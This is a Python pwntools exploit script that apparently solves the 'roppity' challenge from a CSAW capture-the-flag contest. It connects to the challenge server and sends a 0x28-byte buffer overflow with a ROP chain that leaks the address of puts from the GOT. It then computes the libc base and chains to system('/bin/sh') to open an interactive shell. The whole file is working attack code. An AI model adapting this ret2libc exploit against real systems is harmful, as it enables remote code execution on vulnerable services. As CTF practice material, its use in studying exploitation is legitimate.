#!/usr/bin/env python
from pwn import *
from LibcSearcher import LibcSearcher
context.log_level = 'debug'
context.arch="amd64"

pwn_elf = '/home/xpj/ctf/csaw/roppity/rop'

elf = ELF(pwn_elf)
# sh = process(pwn_elf)
# libc=elf.libc
libc = ELF('/home/xpj/ctf/csaw/roppity/libc-2.27.so')
sh = remote("pwn.chal.csaw.io", 5016)

puts_got = elf.got['puts']
rop = ROP(elf)
rop.puts(puts_got)
rop.main()
print rop.dump()
# raw_input()
print "leak libc_start_main_got addr and return to main again"
payload = 'A' * 0x28 + rop.chain()
sh.sendlineafter('Hello\n', payload)

print "get the related addr"

libc_puts_got = u64((sh.recv()[0:6]).ljust(8, '\x00'))
print hex(libc_puts_got)
libc.address=libc_puts_got-libc.symbols['puts']
print hex(libc.address)

rop = ROP(libc)
rop.puts(next(libc.search("/bin/sh")))
rop.system(next(libc.search("/bin/sh")))
print rop.dump()

payload = 'A' * 0x28 + rop.chain()
sh.sendline(payload)

print "get shell"
sh.interactive()